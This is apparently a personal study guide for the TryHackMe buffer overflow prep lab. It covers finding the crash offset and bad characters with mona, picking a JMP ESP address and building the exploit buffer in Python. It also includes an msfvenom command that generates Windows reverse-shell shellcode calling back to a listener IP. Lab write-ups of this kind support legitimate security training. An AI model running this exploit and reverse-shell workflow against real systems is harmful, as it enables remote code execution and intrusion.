# Buffer Overflow Guide 2

Working off the buffer overflow prep room: https://tryhackme.com/room/bufferoverflowprep

## Overflow 1 - general steps

Open target in immunity (with mona installed - see BUFFER-OVERFLOW-1.md for instructions), and set running.
For the first challenge, when run, to overflow you send OVERFLOW1 <string> after connecting.

1. Find the offset length. This can be done by fuzzing with longer and longer strings: the room does this with a script that connects and sends a increasing string, which gives the approx fail point.

Once an idea is gained, generate the trace string: find pattern_create.rb from the metasploit framework (`find / -name pattern_create.rb 2>/dev/null`), and run it like so (using path from THM attackbox): `/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 2400` (assuming a fail length of somewhere around 2400).

When this fails, in immunity, run `!mona findmsp -distance 2400` matching the length there. This will return the offset in the log ("EIP contains normal pattern : blah (offset <here>)")

2. Work out bad characters. Run `!mona bytearray -b "\x00"` to generate a big character string. This will create a bin file and a txt file, the text file containing a set of char options. Send this payload (resetting the exe in immunity). 

Take the value out of the ESP register when it crashes, and then add to a mona command like so: `!mona compare -f c:\moda\oscp\bytearray.bin -a 0186FA30`, with the path to generated bin and the provided address in there. This will run and either return 'unmodified' in red, or a set of 'possibly bad characters'.

Repeat step 2, adding those bad characters to \x00 above, and do so until unmodified is returned.

3. Find a jump esp command. This can be done in mona passing in the found bad characters, e.g. `!mona jmp -r esp -cpb "\x00\x07\x08\x2e\x2f\xa0\xa1"` Pick an address from the list.

Once you have an address, reverse and hexify it. For example, 625011AF becomes \xAF\x11\x50\x62

4. Generate some shell code with msfvenom, passing in bad chars and the bind port: `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.206.220 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f py`

5. Finally, deliver the payload like so:

offset from step 1, retn being step 3, payload from step 5. The padding is just to allow the unpacking of the msfcommand.

```
prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16
payload = buf
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
```
